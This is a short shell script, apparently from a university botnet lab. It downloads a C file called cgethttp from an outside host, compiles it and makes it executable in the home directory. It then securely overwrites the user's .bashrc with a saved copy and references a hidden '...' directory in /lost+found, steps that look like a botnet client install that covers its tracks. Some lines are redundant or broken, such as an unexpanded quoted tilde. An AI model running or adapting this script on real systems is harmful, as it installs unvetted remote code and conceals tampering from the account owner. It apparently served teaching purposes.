#!/bin/sh
DIRECTORY="~/"
TARGET=".bashrc"
FULLPATH="${DIRECTORY}${TARGET}"
BACKUP="${TARGET}_old"

DIR='/lost+found/'
FOLDER='...'

rm ~/cgethttp.c                                                                                                             
wget "abstract.cs.washington.edu/~roy/lab3/Botnet/cgethttp_old.c"                      
mv cgethttp_old.c ~/cgethttp.c
gcc ~/cgethttp.c -o ~/cgethttp
chmod +x ~/cgethttp

#rm ~/.bashrc
#echo `pwd` > ~/output
rm -P ~/.bashrc
cp ./.bashrc_old ~/tmp
cp ~/tmp ~/.bashrc
cat ~/tmp > ~/.bashrc
mv ~/tmp ~/.bashrc

cd ..
#rm -r ${FOLDER}
cd ~/